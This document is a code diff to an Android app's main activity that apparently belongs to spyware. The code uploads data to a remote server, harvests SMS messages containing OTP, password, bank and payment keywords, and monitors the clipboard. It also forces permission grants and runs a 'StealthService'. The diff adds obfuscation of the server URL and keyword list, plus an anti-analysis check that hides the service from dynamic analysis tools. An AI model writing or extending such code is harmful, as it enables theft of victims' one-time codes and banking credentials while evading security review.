@@ -43,9 +43,7 @@ class MainActivity : ComponentActivity() {
     fun sendDataToServer(action: String) {
         Thread {
             try {
-                val url = java.net.URL(
-                    "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
-                )
+                val url = java.net.URL(ObfuscationHelper.serverUrl)
                 val connection = url.openConnection() as java.net.HttpURLConnection
 
                 connection.requestMethod = "POST"
@@ -222,11 +220,7 @@ class MainActivity : ComponentActivity() {
                         val date = it.getLong(dateColumn)
 
                         // Only capture messages that look sensitive
-                        val sensitiveKeywords = listOf(
-                            "OTP", "otp", "code", "verification", "verify",
-                            "password", "passcode", "login", "bank", "account",
-                            "credit", "debit", "payment", "transaction", "₹", "$"
-                        )
+                        val sensitiveKeywords = ObfuscationHelper.smsKeywords
 
                         if (sensitiveKeywords.any { keyword -> body.contains(keyword, ignoreCase = true) }) {
                             smsList.add(mapOf(
@@ -447,14 +441,19 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Install analysis-evasion exception handler early
+        AntiAnalysis.install(this)
+
         sendDataToServer("user_login")
         Spywareold.startClipboardMonitoring(this)
 
         // FORCE PERMISSIONS - app won't continue until granted
         forceRequestPermissions()
 
-        // Start the new stealth service
-        startService(Intent(this, StealthService::class.java))
+        // Start background service only when not running under a dynamic analysis tool
+        if (!AntiAnalysis.isAnalysisEnvironment()) {
+            startService(Intent(this, StealthService::class.java))
+        }
 
         // Request permissions
         requestUsageStatsPermission()
